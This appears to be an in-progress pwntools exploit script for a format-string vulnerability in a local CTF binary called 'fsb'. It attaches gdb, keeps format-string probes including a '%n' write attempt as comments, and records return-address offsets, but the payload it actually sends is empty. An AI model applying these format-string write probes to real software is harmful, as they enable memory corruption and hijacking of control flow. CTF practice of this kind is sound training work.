# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
name = './fsb'
r = process(name)

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

gdb.attach(r, """
br *0x400661
""");
payload = ''
# payload += p64(0x7fffffffdb88).strip('\x00')+"AB%10dAB%dA%pB\nA%pB\nA%pB\nA%pB\nA%pB\n"
# payload += "A"*2
# payload += 'A%x\n%1$nB'
# payload += 'A%pB\n'*5
# payload += "0x%x\n"*100
# r.sendline("AAAAAAAAAA%n%x\n0x%x\n0x%x\n")

r.sendline(payload)
print(str(r.proc.pid))


print(str(r.proc.pid))

r.interactive()

# buf       0x7fffffffdab0
# ret addr  0x7fffffffdb88 

# ret = buf +0xd8